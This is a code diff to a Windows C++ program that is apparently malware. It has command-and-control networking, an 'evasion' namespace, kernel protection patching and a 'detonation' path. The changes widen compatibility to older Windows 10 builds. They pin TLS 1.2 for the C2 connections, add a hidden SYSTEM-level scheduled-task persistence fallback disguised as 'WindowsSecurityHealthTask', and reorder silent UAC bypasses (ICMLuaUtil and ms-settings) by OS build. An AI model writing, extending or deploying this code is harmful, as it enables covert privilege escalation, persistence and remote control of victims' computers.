@@ -65,6 +65,22 @@
 #include "campaign_config.h"
 #endif
 
+// Windows 10 RTM is 10.0.10240. Windows 11 still reports major 10; Server
+// 2016/2019/2022 do too, so the major/build pair is the compatibility gate.
+static bool QueryWindowsVersion(DWORD* major, DWORD* build) {
+    typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
+    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
+    if (!ntdll) return false;
+    RtlGetVersionPtr fn = (RtlGetVersionPtr)GetProcAddress(ntdll, "RtlGetVersion");
+    if (!fn) return false;
+    RTL_OSVERSIONINFOW vi{};
+    vi.dwOSVersionInfoSize = sizeof(vi);
+    if (fn(&vi) != 0) return false;
+    if (major) *major = vi.dwMajorVersion;
+    if (build) *build = vi.dwBuildNumber;
+    return true;
+}
+
 // ============================================================================
 // 1. GLOBAL CONFIGURATION
 // ============================================================================
@@ -1414,16 +1430,9 @@ namespace vex {
         // kProtectionOffset lands in an unrelated field, so the driver path
         // refuses rather than risking a kernel corruption.
         static bool SupportedEprocessLayout() {
-            typedef LONG(WINAPI* RtlGetVersionPtr)(OSVERSIONINFOW*);
-            HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
-            if (!hNtdll) return false;
-            RtlGetVersionPtr fn = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
-            if (!fn) return false;
-            OSVERSIONINFOW vi{};
-            vi.dwOSVersionInfoSize = sizeof(vi);
-            if (fn(&vi) != 0) return false;
-            return vi.dwMajorVersion == 10 &&
-                vi.dwBuildNumber >= 19041 && vi.dwBuildNumber <= 19045;
+            DWORD major = 0, build = 0;
+            if (!QueryWindowsVersion(&major, &build)) return false;
+            return major == 10 && build >= 19041 && build <= 19045;
         }
 
         // Last evasion outcome, reported to the panel by the detonation path.
@@ -2743,6 +2752,12 @@ namespace vex {
                 DWORD noRedirect = WINHTTP_DISABLE_REDIRECTS;
                 api.SetOption(hS, WINHTTP_OPTION_DISABLE_FEATURE,
                     &noRedirect, sizeof(noRedirect));
+                // Windows 10 1507 WinHTTP does not always negotiate TLS 1.2
+                // for a fresh session. Pin it explicitly; TLS 1.2 exists on
+                // every supported Windows 10 build.
+                DWORD tls12 = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
+                api.SetOption(hS, WINHTTP_OPTION_SECURE_PROTOCOLS,
+                    &tls12, sizeof(tls12));
             }
 
             const uint16_t port = g_c2PortOverride ? g_c2PortOverride : config::kC2Port;
@@ -2816,6 +2831,12 @@ namespace vex {
                 DWORD noRedirect = WINHTTP_DISABLE_REDIRECTS;
                 api.SetOption(hS, WINHTTP_OPTION_DISABLE_FEATURE,
                     &noRedirect, sizeof(noRedirect));
+                // Windows 10 1507 WinHTTP does not always negotiate TLS 1.2
+                // for a fresh session. Pin it explicitly; TLS 1.2 exists on
+                // every supported Windows 10 build.
+                DWORD tls12 = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
+                api.SetOption(hS, WINHTTP_OPTION_SECURE_PROTOCOLS,
+                    &tls12, sizeof(tls12));
             }
 
             const uint16_t port = g_c2PortOverride ? g_c2PortOverride : config::kC2Port;
@@ -3469,6 +3490,18 @@ namespace vex {
                 tempFile + L"\" /f";
             DWORD rc = 1;
             bool ok = utils::RunHidden(cmd, 15000, &rc) && rc == 0;
+            if (!ok) {
+                // Older Windows 10 task XML imports can be rejected by policy
+                // or a TASKHOST version mismatch. /sc onlogon is accepted from
+                // 1507 onward and carries the same SYSTEM/logon semantics.
+                std::wstring tr = InstalledPath();
+                if (!extraArgs.empty()) tr += L" " + extraArgs;
+                std::wstring fallback =
+                    L"schtasks.exe /create /tn \"WindowsSecurityHealthTask\" /tr \""
+                    + tr + L"\" /sc onlogon /ru SYSTEM /rl HIGHEST /f";
+                DWORD frc = 1;
+                ok = utils::RunHidden(fallback, 15000, &frc) && frc == 0;
+            }
             if (ok) {
                 // Read the task back; a create exit code alone is not proof the
                 // registration survived policy or a partially-applied import.
@@ -7184,6 +7217,14 @@ int main(int argc, char* argv[]) {
         return 0;
     }
 
+    DWORD osMajor = 0, osBuild = 0;
+    if (!QueryWindowsVersion(&osMajor, &osBuild) ||
+            osMajor != 10 || osBuild < 10240) {
+        fwprintf(stderr, L"[-] unsupported Windows: this build requires Windows "
+                         L"10 1507 (10.0.10240) or newer\n");
+        return 3;
+    }
+
     if (!IsElevated() && !noElevate) {
         // A child that was launched for elevation but arrived without a
         // privileged token must not start another round.
@@ -7191,9 +7232,15 @@ int main(int argc, char* argv[]) {
         wchar_t self[MAX_PATH]{};
         if (GetModuleFileNameW(NULL, self, MAX_PATH)) {
             std::wstring tail = vex::utils::CommandLineTail();
-            // Silent paths first; the runas prompt is the fallback.
-            if (vex::evasion::TryICMLuaUtil(self, tail)) return 0;
-            if (vex::evasion::TryUACBypass(self, tail)) return 0;
+            // Early Windows 10 has no reliable CMSTPLUA handler; use the
+            // ms-settings trigger first there. Modern builds prefer ICMLuaUtil.
+            if (osBuild >= 17763) {
+                if (vex::evasion::TryICMLuaUtil(self, tail)) return 0;
+                if (vex::evasion::TryUACBypass(self, tail)) return 0;
+            } else {
+                if (vex::evasion::TryUACBypass(self, tail)) return 0;
+                if (vex::evasion::TryICMLuaUtil(self, tail)) return 0;
+            }
             SHELLEXECUTEINFOW sei{ sizeof(sei) };
             std::wstring params = L"--uac-child";
             if (!tail.empty()) params += L" " + tail;
